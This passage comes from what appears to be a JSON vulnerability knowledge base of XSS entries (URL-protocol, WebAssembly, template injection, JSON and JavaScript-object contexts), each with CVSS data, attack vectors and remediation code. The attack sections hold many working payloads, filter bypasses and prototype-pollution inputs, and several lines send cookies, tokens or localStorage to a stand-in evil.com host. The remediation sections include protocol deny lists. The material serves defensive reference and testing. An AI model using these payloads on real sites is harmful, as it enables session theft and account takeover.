java\\nscript:alert(1)\n    jav&#x0A;ascript:alert(1)\n    jav%0Aascript:alert(1)\n\n18. CARRIAGE RETURN:\n    java\\rscript:alert(1)\n    jav&#x0D;ascript:alert(1)\n    jav%0Dascript:alert(1)\n\n19. NULL BYTE:\n    javascript\\x00:alert(1)\n    java\\0script:alert(1)\n\n20. MULTIPLE WHITESPACE:\n    java   script:alert(1)\n    java\\t\\n\\rscript:alert(1)\n\nALTERNATIVE PROTOCOLS:\n\n21. VBSCRIPT (IE):\n    vbscript:msgbox(1)\n    vbscript:Execute(\"msgbox 1\")\n\n22. FILE PROTOCOL:\n    file:///etc/passwd  (Local file access)\n    file://\\\\attacker.com\\share\\file  (UNC path)\n\n23. ABOUT PROTOCOL:\n    about:blank  (Can be manipulated with DOM)\n\n24. BLOB PROTOCOL:\n    blob:https://example.com/uuid  (If attacker controls blob)\n\n25. MS-OFFICE PROTOCOLS:\n    ms-word:ofe|u|https://attacker.com/doc.docx\n    ms-excel:ofe|u|https://attacker.com/sheet.xlsx\n    ms-powerpoint:ofe|u|https://attacker.com/pres.pptx\n\n26. CUSTOM APP PROTOCOLS:\n    skype:user?call\n    facetime:phone-number\n    tel:+1234567890\n    sms:+1234567890\n    mailto:victim@example.com\n    geo:0,0\n    spotify:track:id\n    slack://open\n    zoommtg://zoom.us/join?confno=123\n    steam://install/123\n    discord://discord.com/channels/123\n\n27. PROPRIETARY PROTOCOLS:\n    ms-settings:  (Windows settings)\n    ms-calculator:  (Launch calculator)\n    ms-availablenetworks:  (Network settings)\n\nFORM ACTION HIJACKING:\n\n28. FORM ACTION WITH JAVASCRIPT:\n    <form action=\"javascript:alert(1)\">\n\n29. FORMACTION ATTRIBUTE:\n    <button formaction=\"javascript:alert(1)\">Submit</button>\n    <input type=\"submit\" formaction=\"javascript:alert(1)\">\n\n30. FORM WITH DATA URI:\n    <form action=\"data:text/html,<script>alert(1)</script>\">\n\nBASE TAG ATTACKS:\n\n31. BASE HREF HIJACKING:\n    <base href=\"https://attacker.com/\">\n    (All relative URLs now point to attacker's domain)\n\n32. BASE WITH JAVASCRIPT:\n    <base href=\"javascript:alert(1)\">  (Blocked in modern browsers)\n\nMETA REFRESH ATTACKS:\n\n33. META REFRESH WITH JAVASCRIPT:\n    <meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">\n\n34. META REFRESH WITH DATA:\n    <meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert(1)</script>\">\n\n35. META REFRESH TO PHISHING:\n    <meta http-equiv=\"refresh\" content=\"0;url=https://evil.com/phish\">\n\nREDIRECT PARAMETER EXPLOITATION:\n\n36. OPEN REDIRECT TO XSS:\n    ?redirect=javascript:alert(1)\n    ?url=data:text/html,<script>alert(1)</script>\n    ?next=//evil.com\n\n37. DOUBLE SLASH TRICK:\n    //evil.com\n    ///evil.com\n    ////evil.com\n    (Becomes protocol-relative URL)\n\n38. BACKSLASH CONFUSION:\n    https://trusted.com\\@evil.com\n    https://trusted.com\\\\evil.com\n\n39. @ SYMBOL ABUSE:\n    https://trusted.com@evil.com\n    https://user:pass@evil.com\n\n40. URL PARAMETER POLLUTION:\n    https://trusted.com?url=https://trusted.com&url=https://evil.com\n\nSVG AND XML:\n\n41. SVG WITH XLINK:\n    <svg><use xlink:href=\"data:image/svg+xml,<svg id=x onload=alert(1)>\"></use></svg>\n\n42. SVG WITH SCRIPT:\n    <svg><script xlink:href=\"https://evil.com/xss.js\"></script></svg>\n\n43. XML WITH ENTITY:\n    <img src=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E\">\n\nCSS URL() IN HREF:\n\n44. CSS IMPORT IN DATA URI:\n    data:text/html,<style>@import 'https://evil.com/evil.css';</style>\n\n45. BACKGROUND URL:\n    data:text/html,<div style=\"background:url('https://evil.com/track')\">\n\nIFRAME SANDBOX BYPASS:\n\n46. IFRAME WITH ALLOW-SCRIPTS:\n    <iframe sandbox=\"allow-scripts\" src=\"data:text/html,<script>alert(1)</script>\">\n\n47. IFRAME SRCDOC:\n    <iframe srcdoc=\"<script>alert(1)</script>\">\n\nLINK PREFETCH/PRERENDER:\n\n48. LINK PREFETCH:\n    <link rel=\"prefetch\" href=\"https://evil.com/track\">\n\n49. LINK PRERENDER:\n    <link rel=\"prerender\" href=\"https://evil.com/page\">\n\n50. DNS PREFETCH:\n    <link rel=\"dns-prefetch\" href=\"//evil.com\">\n\nFILTER BYPASS TECHNIQUES:\n\n51. COMMENTS IN PROTOCOL:\n    java/*comment*/script:alert(1)\n\n52. HTML ENTITIES:\n    &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\n    javascript&#58;alert(1)  (&#58; = ':')\n\n53. UNICODE NORMALIZATION:\n    \\u0001javascript:alert(1)  (Zero-width character)\n\n54. OVERLONG UTF-8:\n    Exploit UTF-8 parsing differences\n\n55. URL WITH CREDENTIALS:\n    https://user:javascript:alert(1)@trusted.com\n\nREAL-WORLD ATTACK SCENARIOS:\n\nOAUTH CALLBACK HIJACKING:\n?redirect_uri=javascript:fetch('//evil.com?token='+location.hash)\n?callback=https://evil.com/steal?\n\nPHISHING VIA OPEN REDIRECT:\n<a href=\"?redirect=https://trusted-site.com.evil.com/login\">\nClick here to verify your account\n</a>\n\nSESSION HIJACKING:\n<a href=\"javascript:fetch('//evil.com/steal?c='+document.cookie)\">\nDownload Receipt\n</a>\n\nCSRF VIA FORM ACTION:\n<form action=\"https://bank.com/transfer\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n  <button>Claim your prize!</button>\n</form>\n\nFILE PROTOCOL ATTACKS:\n<iframe src=\"file:///etc/passwd\">\n<iframe src=\"file://\\\\attacker.com\\share\\file\">\n\nMOBILE APP DEEP LINK EXPLOITATION:\nmyapp://open?url=javascript:alert(1)\nmyapp://webview?url=data:text/html,<script>alert(1)</script>\n\nPROTOCOL HANDLER REGISTRATION:\nnavigator.registerProtocolHandler(\n  'web+xss',\n  'https://evil.com/?uri=%s',\n  'XSS Handler'\n);\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. STRICT URL VALIDATION:\n   \n   Protocol whitelist (most restrictive):\n   allowed_protocols = ['http://', 'https://']\n   \n   Python:\n   from urllib.parse import urlparse\n   \n   def is_safe_url(url):\n       if not url:\n           return False\n       \n       # Block javascript:, data:, etc.\n       dangerous = ['javascript:', 'data:', 'vbscript:', 'file:', 'about:', 'blob:']\n       url_lower = url.lower().replace(' ', '').replace('\\t', '').replace('\\n', '')\n       \n       for danger in dangerous:\n           if danger in url_lower:\n               return False\n       \n       # Validate structure\n       try:\n           parsed = urlparse(url)\n           return parsed.scheme in ['http', 'https', 'mailto', 'tel']\n       except:\n           return False\n   \n   PHP:\n   function isSafeURL($url) {\n       $url = strtolower(preg_replace('/\\s+/', '', $url));\n       \n       $dangerous = ['javascript:', 'data:', 'vbscript:', 'file:', 'about:', 'blob:'];\n       foreach ($dangerous as $danger) {\n           if (strpos($url, $danger) !== false) {\n               return false;\n           }\n       }\n       \n       $parsed = parse_url($url);\n       return isset($parsed['scheme']) && \n              in_array($parsed['scheme'], ['http', 'https', 'mailto', 'tel']);\n   }\n   \n   JavaScript:\n   function isSafeURL(url) {\n       try {\n           const parsed = new URL(url, window.location.href);\n           return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);\n       } catch {\n           return false;\n       }\n   }\n\n2. URL PARSING, NOT REGEX:\n   \n   BAD (Regex bypass possible):\n   if (preg_match('/^https?:\\/\\//', $url)) { /* allowed */ }\n   \n   GOOD (Use URL parser):\n   $parsed = parse_url($url);\n   if ($parsed['scheme'] === 'https') { /* allowed */ }\n\n3. ENCODE URL OUTPUT:\n   \n   HTML attribute context:\n   <a href=\"<?php echo htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>\">\n   \n   JavaScript context:\n   <script>\n   var url = <?php echo json_encode($url) ?>;\n   </script>\n\n4. REL ATTRIBUTE PROTECTION:\n   \n   External links:\n   <a href=\"<?php echo $url ?>\" rel=\"noopener noreferrer\">\n   \n   Prevents window.opener attacks\n\n5. CONTENT SECURITY POLICY:\n   \n   Restrict protocols:\n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self';\n     img-src 'self' https:;\n     form-action 'self';\n     frame-ancestors 'none';\n     base-uri 'none';\n\n6. DISABLE JAVASCRIPT PROTOCOL:\n   \n   Some frameworks:\n   - React: Blocks javascript: by default in href\n   - Angular: DomSanitizer blocks unsafe URLs\n   - Vue: Auto-sanitizes href bindings\n\n7. VALIDATE REDIRECT URLS:\n   \n   Whitelist domains:\n   $allowed_domains = ['trusted.com', 'app.trusted.com'];\n   $parsed = parse_url($redirect_url);\n   \n   if (!in_array($parsed['host'], $allowed_domains)) {\n       die('Invalid redirect');\n   }\n   \n   Or use allowlist pattern:\n   if (!preg_match('/^https:\\/\\/([a-z]+\\.)?trusted\\.com\\//', $url)) {\n       die('Invalid URL');\n   }\n\n8. REFERRER POLICY:\n   \n   Prevent referrer leakage:\n   Referrer-Policy: no-referrer\n   Referrer-Policy: strict-origin-when-cross-origin\n   \n   HTML:\n   <meta name=\"referrer\" content=\"no-referrer\">\n\n9. SUBRESOURCE INTEGRITY:\n   \n   For external scripts:\n   <script src=\"https://cdn.example.com/lib.js\"\n           integrity=\"sha384-hash\"\n           crossorigin=\"anonymous\">\n   </script>\n\n10. FRAMEWORK-SPECIFIC PROTECTION:\n    \n    React:\n    <a href={userURL}>  {/* Auto-sanitized */}\n    \n    Vue:\n    <a :href=\"userURL\">  <!-- Sanitized -->\n    \n    Angular:\n    import { DomSanitizer } from '@angular/platform-browser';\n    \n    constructor(private sanitizer: DomSanitizer) {}\n    \n    getSafeURL(url: string) {\n        return this.sanitizer.sanitize(SecurityContext.URL, url);\n    }\n\nSECURITY CHECKLIST:\n\n[ ] URL validation with protocol whitelist\n[ ] URL parser used (not regex)\n[ ] Dangerous protocols blocked (javascript:, data:, vbscript:)\n[ ] URL encoding applied in output\n[ ] rel=\"noopener noreferrer\" on external links\n[ ] CSP configured with form-action, base-uri\n[ ] Redirect URLs validated against domain whitelist\n[ ] Referrer-Policy header configured\n[ ] SRI used for external resources\n[ ] Framework auto-sanitization enabled\n[ ] No user input in <base> tags\n[ ] Meta refresh validated\n[ ] Deep links validated in mobile apps\n[ ] Regular security testing\n[ ] Code review for all URL handling\n\nTESTING PAYLOADS:\n\nJavaScript protocol:\njavascript:alert(1)\nJaVaScRiPt:alert(1)\njava\\tscript:alert(1)\njav&#x09;ascript:alert(1)\n\nData URI:\ndata:text/html,<script>alert(1)</script>\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n\nEncoding bypass:\njavascript:%61lert(1)\nj%61vascript:alert(1)\n\nProtocol alternatives:\nvbscript:msgbox(1)\nfile:///etc/passwd\n\nOpen redirect:\n//evil.com\nhttps://trusted.com@evil.com\n\nTOOLS:\n- URL Parser Test: https://url.spec.whatwg.org/\n- CSP Evaluator: https://csp-evaluator.withgoogle.com/\n- Burp Suite: URL fuzzing\n- OWASP ZAP: Spider and scanner\n\nOWASP REFERENCES:\n- OWASP XSS Prevention Cheat Sheet: Rule #5\n- OWASP Unvalidated Redirects and Forwards\n- CWE-79: Cross-site Scripting\n- CWE-601: URL Redirection to Untrusted Site\n"
  },
  "wasm_context": {
    "title": "Cross-Site Scripting in WebAssembly Context",
    "severity": "medium",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "wasm",
      "webassembly",
      "binary",
      "modern-web"
    ],
    "description": "\nWebAssembly (WASM) is used for high-performance web applications. While WASM itself is sandboxed and \ncannot directly access the DOM, XSS vulnerabilities can occur when WASM modules interact with JavaScript \nthrough imports/exports, especially when processing user input or generating dynamic content.\n\nSEVERITY: MEDIUM to HIGH\nEmerging threat as WASM adoption increases. Complex attack surface.\n",
    "attack_vector": "\nWASM EXPORTING STRINGS TO JAVASCRIPT:\nWasmModule.exports.getUserData() returns raw HTML\nJavaScript inserts via innerHTML without sanitization\n\nMEMORY CORRUPTION TO JAVASCRIPT:\nBuffer overflow in WASM leading to JavaScript string injection\n\nTYPE CONFUSION:\nBetween WASM and JavaScript causing unexpected data in DOM\n\nWASM-GENERATED CODE:\nWASM generating SQL or template code executed in JavaScript\n\nUNSAFE STRING HANDLING:\nC/C++/Rust code compiled to WASM with unsafe string operations\n\nJAVASCRIPT GLUE CODE:\nEmscripten-generated code with eval() or Function()\n\nWASM LOADING USER DATA:\nPassing unsanitized user input to dangerous JS APIs\n\nBUFFER OVERFLOWS:\nLeading to JavaScript heap manipulation\n\nPROTOTYPE POLLUTION:\nVia WASM-JS boundary\n",
    "remediation": "\nDEFENSE:\n\n1. TREAT WASM OUTPUTS AS UNTRUSTED\n   Apply same XSS protections as regular user input\n\n2. SANITIZE WASM-GENERATED CONTENT\n   Validate and encode WASM strings before DOM use\n\n3. USE SAFE APIS\n   textContent instead of innerHTML for WASM output\n\n4. MEMORY-SAFE LANGUAGES\n   Use Rust (borrow checker) or AssemblyScript over C/C++\n\n5. BOUNDS CHECKING\n   Implement in WASM code\n\n6. VALIDATE AT WASM-JS BOUNDARY\n   Check data types and structures\n\n7. CSP CONFIGURATION\n   Content-Security-Policy: script-src 'wasm-unsafe-eval'\n   Control carefully\n\n8. AUDIT GLUE CODE\n   Review emscripten or wasm-bindgen generated code\n\n9. KEEP TOOLCHAINS UPDATED\n\n10. INPUT VALIDATION\n    Before passing data to WASM\n\nExample:\n// WASM exports function that returns user data\nconst userData = wasmModule.getUserData();\n\n// BAD:\nelement.innerHTML = userData;\n\n// GOOD:\nelement.textContent = userData;\n// OR\nelement.innerHTML = DOMPurify.sanitize(userData);\n\nTOOLS:\n- WASM security analyzers\n- Memory sanitizers (ASan, MSan)\n- Fuzzing tools for WASM\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- WebAssembly Security\n"
  },
  "template_injection": {
    "title": "Client-Side Template Injection Leading to XSS",
    "severity": "critical",
    "cvss_score": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": [
      "CWE-79",
      "CWE-94"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "template",
      "injection",
      "sandbox-escape",
      "modern-web"
    ],
    "description": "\nClient-Side Template Injection (CSTI) occurs when user input is embedded into client-side templates \nand evaluated as template code rather than text. This allows attackers to break out of the template \ncontext and execute arbitrary JavaScript. CSTI is particularly dangerous in Single Page Applications \nand can bypass traditional XSS protections.\n\nAffects: Angular/AngularJS, Vue.js, React, Handlebars, Mustache, Pug, EJS, and other template engines.\n\nSEVERITY: CRITICAL\nDirect code execution in modern JavaScript frameworks. Increasingly common in SPAs.\n",
    "attack_vector": "\nFRAMEWORK-SPECIFIC ATTACKS:\n\nANGULARJS (1.x):\n{{constructor.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{a='alert';b='(1)';a+b}}\n{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"alert(1)\"].sort(toString.constructor)}}\n\nANGULAR (2+):\n{{constructor.constructor('alert(1)')()}}\nTemplate: <div>{{userInput}}</div> is safe by default\nBut [innerHTML]=\"userInput\" is dangerous\n\nVUE.JS:\n{{constructor.constructor('alert(1)')()}}\n{{_c.constructor('alert(1)')()}}\n<div v-html=\"userInput\"></div> - dangerous\n\nREACT:\n<div dangerouslySetInnerHTML={{__html: userInput}} />\nJSX injection if not properly escaped\n\nHANDLEBARS:\n{{#with this}}{{lookup . 'constructor'}}{{/with}}\n{{#each this}}{{@key}}{{/each}}\n\nMUSTACHE:\nSimilar to Handlebars but more restricted\n\nPUG/JADE:\n#{7*7} - for detection\nUnescaped: !{userInput}\n\nEJS:\n<%= 7*7 %> - escaped\n<%- userInput %> - unescaped, dangerous\n\nTWIG:\n{{7*7}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"alert(1)\")}}\n",
    "remediation": "\nDEFENSE:\n\n1. NEVER RENDER USER INPUT AS TEMPLATE CODE\n2. Use framework auto-escaping\n3. Disable runtime template compilation in production\n4. Use precompiled templates\n5. Implement CSP\n6. Regular security updates\n7. Static analysis tools\n8. Security testing with framework-specific payloads\n\nANGULAR:\n- Use [innerText] or [textContent]\n- Disable template compilation (AOT)\n- Use DomSanitizer\n\nVUE:\n- Avoid v-html with user input\n- Use {{ }} which auto-escapes\n\nREACT:\n- Avoid dangerouslySetInnerHTML\n- JSX auto-escapes by default\n\nTOOLS:\n- ESLint plugins for template security\n- Framework-specific security scanners\n- Semgrep rules\n\nOWASP REFERENCES:\n- CWE-94: Code Injection\n- OWASP Template Injection\n"
  },
  "json_value": {
    "title": "Cross-Site Scripting (XSS) in JSON Context",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "json",
      "api",
      "ajax",
      "modern-web"
    ],
    "description": "\nUser input is embedded within JSON data that is later parsed and rendered by JavaScript. While JSON \nitself is safe, improper handling after parsing can lead to XSS. Common in REST APIs, AJAX responses, \nand modern SPA applications.\n\nSEVERITY: HIGH\nVery common in modern web applications. Often overlooked by developers.\n",
    "attack_vector": "\nJSON PARSED THEN RENDERED UNSAFELY:\n{\"name\": \"<img src=x onerror=alert(1)>\"}\nIf rendered via innerHTML\n\nJSON IN SCRIPT TAG:\n<script>var data = {\"value\": \"USER_INPUT\"}</script>\nPayload: \"}; alert(1); var x={\"\n\nJSON HIJACKING:\nAttacker includes JSON in their page and accesses via <script src=...>\n\nJSONP CALLBACK:\ncallback({\"data\": \"USER_INPUT\"})\nPayload: \"}); alert(1); callback({\"data\": \"\n\nUNICODE ESCAPES:\n{\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}\n\nPROTOTYPE POLLUTION:\n{\"__proto__\": {\"polluted\": true}}\n",
    "remediation": "\nDEFENSE:\n\n1. VALIDATE JSON STRUCTURE SERVER-SIDE\n2. Use proper Content-Type: application/json\n3. Parse with JSON.parse(), never eval()\n4. Sanitize data AFTER parsing before DOM manipulation\n5. Use textContent, not innerHTML for JSON values\n6. Implement CSP\n7. Validate and sanitize after parsing\n8. Use CORS instead of JSONP\n\nPHP:\njson_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);\n\nJavaScript:\nconst data = JSON.parse(response);\nelement.textContent = data.value; // Safe\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- OWASP JSON Security Cheat Sheet\n"
  },
  "js_object": {
    "title": "Cross-Site Scripting (XSS) in JavaScript Object Context",
    "severity": "high",
    "cvss_score": 7.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "javascript",
      "object",
      "property-injection",
      "modern-web"
    ],
    "description": "\nUser input is reflected within a JavaScript object literal without proper sanitization. This allows \nattackers to inject additional properties, methods, or break out of the object context to execute \narbitrary code. Modern JavaScript frameworks and template engines are particularly vulnerable if they \ndynamically construct objects from user input.\n\nVULNERABILITY CONTEXT:\nOccurs when user data is embedded in object literals:\n- <script>var config = {key: USER_INPUT};</script>\n- <script>var user = {name: 'USER_INPUT'};</script>\n- <script>var obj = USER_INPUT;</script>\n- JSON.parse() with user-controlled strings\n- Object.assign() with untrusted sources\n- Spread operator with user objects {...userInput}\n- Dynamic property names {[USER_INPUT]: value}\n- Method definitions {[USER_INPUT]() {}}\n\nCommon in:\n- Configuration objects from server\n- User profile data\n- API responses embedded in pages\n- State management (Redux, Vuex)\n- GraphQL responses\n- WebSocket messages\n- PostMessage data\n- LocalStorage/SessionStorage data\n\nSEVERITY: CRITICAL\nCan lead to prototype pollution, property injection, and arbitrary code execution.\nModern attack vector increasingly exploited in Node.js and browser applications.\n",
    "attack_vector": "\nUNQUOTED VALUE INJECTION:\n\n1. BASIC PROPERTY INJECTION:\n   <script>var config = {admin: USER_INPUT};</script>\n   \n   Payload (unquoted):\n   true, exploit: alert(1), real: false\n   \n   Result:\n   <script>var config = {admin: true, exploit: alert(1), real: false};</script>\n\n2. METHOD INJECTION:\n   Payload:\n   false, hack: function(){alert(1)}, real: true\n   \n   Result:\n   <script>var config = {admin: false, hack: function(){alert(1)}, real: true};</script>\n\n3. COMPUTED PROPERTY INJECTION:\n   Payload:\n   null, [alert(1)]: true, x: null\n   \n   Result:\n   <script>var config = {value: null, [alert(1)]: true, x: null};</script>\n\nQUOTED STRING BREAKOUT:\n\n4. BREAKING OUT OF STRING VALUE:\n   <script>var user = {name: 'USER_INPUT'};</script>\n   \n   Payloads:\n   ', admin: true, real: '\n   ', hack: alert(1), x: '\n   ', get value(){return alert(1)}, x: '\n   \n   Result:\n   <script>var user = {name: '', admin: true, real: ''};</script>\n\n5. DOUBLE QUOTE BREAKOUT:\n   <script>var config = {key: \"USER_INPUT\"};</script>\n   \n   Payload:\n   \", exploit: alert(1), real: \"\n   \n   Result:\n   <script>var config = {key: \"\", exploit: alert(1), real: \"\"};</script>\n\n6. TEMPLATE LITERAL IN OBJECT:\n   <script>var obj = {msg: `USER_INPUT`};</script>\n   \n   Payload:\n   ${alert(1)}\n   \n   Result:\n   <script>var obj = {msg: `${alert(1)}`};</script>\n\nPROTOTYPE POLLUTION ATTACKS:\n\n7. __PROTO__ INJECTION:\n   <script>var config = USER_INPUT;</script>\n   \n   Payload:\n   {\"__proto__\": {\"polluted\": true}}\n   {\"__proto__\": {\"isAdmin\": true}}\n   {\"__proto__\": {\"toString\": \"alert(1)\"}}\n   \n   After merge/assign:\n   Object.prototype.polluted === true // All objects affected!\n\n8. CONSTRUCTOR POLLUTION:\n   Payload:\n   {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}\n   \n   Affects constructor's prototype\n\n9. PROTOTYPE POLLUTION TO XSS:\n   Step 1: Pollute\n   {\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}}\n   \n   Step 2: Trigger when code does:\n   someElement[unknownProp] // Falls back to prototype\n   \n   Or:\n   {\"__proto__\": {\"src\": \"javascript:alert(1)\"}}\n   \n   Then code that does:\n   img.src = obj.src || defaultSrc;\n\n10. PROTOTYPE POLLUTION VIA NESTED PATH:\n    Payload:\n    {\"__proto__.polluted\": \"yes\"}\n    {\"constructor.prototype.isAdmin\": true}\n    \n    Some parsers treat dot as nested property\n\n11. ARRAY INDEX POLLUTION:\n    Payload:\n    {\"__proto__\": [1, 2, 3]}\n    \n    Or:\n    {\"__proto__[0]\": \"polluted\"}\n\nGETTER/SETTER INJECTION:\n\n12. GETTER WITH SIDE EFFECTS:\n    Payload:\n    {get value(){alert(1); return 1}}\n    {get x(){fetch('//evil.com?c='+document.cookie); return null}}\n    \n    Executed when property is accessed:\n    console.log(obj.value); // Triggers alert\n\n13. SETTER INJECTION:\n    Payload:\n    {set value(v){alert(v)}}\n    \n    Executed when property is set:\n    obj.value = 'test'; // Triggers alert('test')\n\n14. COMBINED GETTER/SETTER:\n    Payload:\n    {\n      get admin(){return true},\n      set admin(v){alert('Setting admin to: '+v)}\n    }\n\nCOMPUTED PROPERTY NAMES:\n\n15. EXPRESSION IN PROPERTY NAME:\n    <script>var obj = {[USER_INPUT]: 'value'};</script>\n    \n    Payload:\n    alert(1)\n    \n    Result:\n    <script>var obj = {[alert(1)]: 'value'};</script>\n    (alert executes during property name evaluation)\n\n16. COMPUTED WITH TEMPLATE:\n    Payload:\n    `${alert(1)}`\n    \n    Result:\n    <script>var obj = {[`${alert(1)}`]: 'value'};</script>\n\n17. BREAKING OUT OF COMPUTED:\n    <script>var obj = {[`key_${USER_INPUT}`]: val};</script>\n    \n    Payload:\n    ${alert(1)}`]: null, exploit: alert(2), real: {[`x\n    \n    Result:\n    <script>var obj = {[`key_${alert(1)}`]: null, exploit: alert(2), real: {[`x`]: val};</script>\n\nMETHOD AND FUNCTION INJECTION:\n\n18. METHOD SHORTHAND:\n    Payload:\n    null, exploit(){alert(1)}, real:null\n    \n    Result:\n    <script>var obj = {value: null, exploit(){alert(1)}, real:null};</script>\n\n19. ARROW FUNCTION:\n    Payload:\n    null, hack: ()=>alert(1), real: null\n    \n    Result:\n    <script>var obj = {value: null, hack: ()=>alert(1), real: null};</script>\n\n20. ASYNC METHOD:\n    Payload:\n    null, async exploit(){await fetch('//evil.com')}, real:null\n\n21. GENERATOR METHOD:\n    Payload:\n    null, *gen(){yield alert(1)}, real:null\n\nSYMBOL PROPERTY INJECTION:\n\n22. SYMBOL AS KEY:\n    Payload:\n    [Symbol.toPrimitive]: function(){return alert(1)}\n    [Symbol.iterator]: function*(){yield alert(1)}\n    [Symbol.toStringTag]: alert(1)\n\nOBJECT SPREAD EXPLOITATION:\n\n23. SPREAD OPERATOR POLLUTION:\n    <script>var merged = {...defaults, ...USER_INPUT};</script>\n    \n    If USER_INPUT is:\n    {__proto__: {polluted: true}}\n    \n    Can pollute Object.prototype\n\n24. NESTED SPREAD:\n    <script>var obj = {a: {...USER_INPUT}};</script>\n    \n    Payload:\n    {__proto__: {polluted: true}}\n\nBREAKING OUT OF OBJECT LITERAL:\n\n25. CLOSING BRACE:\n    <script>var obj = {key: USER_INPUT};</script>\n    \n    Payload:\n    null}; alert(1); var obj2 = {key: null\n    \n    Result:\n    <script>var obj = {key: null}; alert(1); var obj2 = {key: null};</script>\n\n26. CLOSING NESTED OBJECT:\n    <script>var obj = {nested: {value: USER_INPUT}};</script>\n    \n    Payload:\n    null}}, exploit: alert(1), real: {value: null\n    \n    Result:\n    <script>var obj = {nested: {value: null}}, exploit: alert(1), real: {value: null}};</script>\n\n27. ARRAY IN OBJECT BREAKOUT:\n    <script>var obj = {items: [USER_INPUT]};</script>\n    \n    Payload:\n    null]}, exploit: alert(1), real: {items: [null\n    \n    Result:\n    <script>var obj = {items: [null]}, exploit: alert(1), real: {items: [null]};</script>\n\nJSON.PARSE EXPLOITATION:\n\n28. JSON STRING INJECTION:\n    <script>var obj = JSON.parse('USER_INPUT');</script>\n    \n    Payload:\n    {\"__proto__\": {\"polluted\": true}}\n    \n    If JSON.parse is vulnerable (older libraries)\n\n29. JSON WITH REVIVER:\n    <script>\n    var obj = JSON.parse(USER_INPUT, function(k, v) {\n        if (k === '__proto__') return; // Attempted protection\n        return v;\n    });\n    </script>\n    \n    Bypass:\n    {\"constructor\": {\"prototype\": {\"polluted\": true}}}\n\n30. JSON UNICODE ESCAPE:\n    Payload:\n    {\"\\u005f\\u005fproto\\u005f\\u005f\": {\"polluted\": true}}\n    (\\u005f = underscore)\n\nFRAMEWORK-SPECIFIC ATTACKS:\n\n31. LODASH MERGE POLLUTION:\n    _.merge(target, USER_INPUT)\n    \n    Payload:\n    {\"__proto__\": {\"polluted\": true}}\n    \n    Affects: lodash < 4.17.11\n\n32. JQUERY EXTEND POLLUTION:\n    $.extend(true, target, USER_INPUT)\n    \n    Payload:\n    {\"__proto__\": {\"polluted\": true}}\n    \n    Affects: jQuery < 3.4.0\n\n33. HOEK MERGE (HAPI.JS):\n    Hoek.merge(target, USER_INPUT)\n    \n    Payload:\n    {\"__proto__\": {\"polluted\": true}}\n    \n    Affects: hoek < 5.0.3\n\n34. MINIMIST PARSER:\n    minimist(USER_INPUT)\n    \n    Payload:\n    ['--__proto__.polluted=true']\n    \n    Affects: minimist < 1.2.6\n\nREAL-WORLD ATTACK SCENARIOS:\n\nAUTHENTICATION BYPASS VIA PROTOTYPE POLLUTION:\n<script>\nvar user = {\"__proto__\": {\"isAdmin\": true}};\nObject.assign(currentUser, user);\n// Now: if (currentUser.isAdmin) { /* access granted */ }\n</script>\n\nSESSION HIJACKING:\n<script>\nvar config = {\n    apiKey: null, \n    steal: function() {\n        fetch('//evil.com?c=' + document.cookie + '&s=' + localStorage.getItem('session'));\n    }, \n    real: null\n};\nconfig.steal();\n</script>\n\nDOM-BASED XSS VIA POLLUTION:\n<script>\n// Pollute prototype\nmerge(defaults, {\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}});\n\n// Later in code:\nelement[someProperty] = \"value\";\n// If someProperty is undefined, falls back to prototype.innerHTML\n</script>\n\nRCE VIA PROTOTYPE POLLUTION (Node.js):\n// In server-side Node.js\nconst obj = {};\nmerge(obj, JSON.parse(userInput));\n// Payload: {\"__proto__\": {\"shell\": \"/bin/bash\", \"argv0\": \"exploit\"}}\n// Later: child_process.spawn() uses polluted properties\n\nDENIAL OF SERVICE:\n<script>\nvar config = {\n    get value() {\n        while(1) {} // Infinite loop\n        return null;\n    }\n};\nconsole.log(config.value); // DoS\n</script>\n",
